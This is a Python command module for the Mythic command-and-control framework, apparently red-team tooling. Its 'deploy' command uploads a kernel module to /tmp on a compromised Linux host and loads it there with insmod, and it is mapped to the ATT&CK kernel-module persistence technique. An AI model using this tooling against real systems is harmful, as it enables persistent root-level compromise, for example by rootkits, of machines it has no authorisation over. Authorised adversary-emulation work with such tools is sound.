from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import os


class DeployArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                cli_name="File",
                display_name="Kernel Module File",
                type=ParameterType.File,
                description="Kernel module (.ko) file to deploy",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                    ),
                ],
            ),
        ]
    
    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require arguments.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)


async def upload_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Callback function that runs after the upload completes"""
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    
    try:
        # Check if the upload was successful
        if not completionMsg.SubtaskData.Task.Completed:
            response.Success = False
            response.TaskStatus = "error: Upload subtask did not complete"
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=completionMsg.TaskData.Task.ID,
                    Response="Upload subtask did not complete".encode()
                )
            )
            return response
            
        if "error" in completionMsg.SubtaskData.Task.Status.lower():
            response.Success = False
            response.TaskStatus = f"error: Failed to upload kernel module: {completionMsg.SubtaskData.Task.Status}"
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=completionMsg.TaskData.Task.ID,
                    Response=f"Failed to upload kernel module: {completionMsg.SubtaskData.Task.Status}".encode()
                )
            )
            return response
        
        # Get the filename from the parent task's args
        filename = completionMsg.TaskData.args.get_arg("filename")
        if not filename:
            response.Success = False
            response.TaskStatus = "error: Could not retrieve filename from parent task"
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=completionMsg.TaskData.Task.ID,
                    Response="Could not retrieve filename from parent task".encode()
                )
            )
            return response
            
        remote_path = f"/tmp/{filename}"
        
        # Create insmod subtask - shell command expects a simple string, not JSON
        insmod_command = f"insmod {remote_path}"
        
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=completionMsg.TaskData.Task.ID,
                CommandName="shell",
                Params=insmod_command  # Shell command expects string, not JSON
            )
        )
        
        # Send status update
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=completionMsg.TaskData.Task.ID,
                Response=f"Kernel module uploaded to {remote_path}. Running insmod...".encode()
            )
        )
        
    except Exception as e:
        response.Success = False
        response.TaskStatus = f"error: Exception in upload callback: {str(e)}"
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=completionMsg.TaskData.Task.ID,
                Response=f"Exception in upload callback: {str(e)}".encode()
            )
        )
    
    return response


class DeployCommand(CommandBase):
    cmd = "deploy"
    needs_admin = True
    help_cmd = "deploy (modal popup)"
    description = "Deploy a kernel module by uploading it to /tmp and running insmod"
    version = 1
    supported_ui_features = []
    author = "Jamie"
    argument_class = DeployArguments
    attackmapping = ["T1547.006", "T1215"]  # Boot or Logon Initialization Scripts: Kernel Modules and Drivers
    attributes = CommandAttributes(
        suggested_command=True,
        dependencies=["upload", "shell"]
    )
    completion_functions = {"upload_complete": upload_complete}

    async def create_go_tasking(
            self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        try:
            # Get the uploaded file information
            file_resp = await SendMythicRPCFileSearch(
                MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID, 
                    AgentFileID=taskData.args.get_arg("file")
                )
            )
            
            if not file_resp.Success:
                raise Exception(
                    f"Failed to fetch uploaded file from Mythic (ID: {taskData.args.get_arg('file')}): {file_resp.Error}"
                )
            
            original_file_name = file_resp.Files[0].Filename
            
            # Ensure the filename ends with .ko
            if not original_file_name.endswith('.ko'):
                raise Exception(
                    f"File must be a kernel module (.ko file). Got: {original_file_name}"
                )
            
            # Store the filename for later use in the callback
            taskData.args.add_arg("filename", original_file_name, type=ParameterType.String)
            
            # Set the remote path to /tmp/filename
            remote_path = f"/tmp/{original_file_name}"
            
            # Create upload subtask with completion callback
            # Upload command expects JSON parameters
            await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    TaskID=taskData.Task.ID,
                    CommandName="upload",
                    Params=json.dumps({
                        "file": taskData.args.get_arg("file"),
                        "remote_path": remote_path
                    }),
                    SubtaskCallbackFunction="upload_complete"
                )
            )
            
            response.DisplayParams = f"Deploying kernel module: {original_file_name}"
            
        except Exception as e:
            response.Success = False
            response.Error = str(e)
            
        return response
    
    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp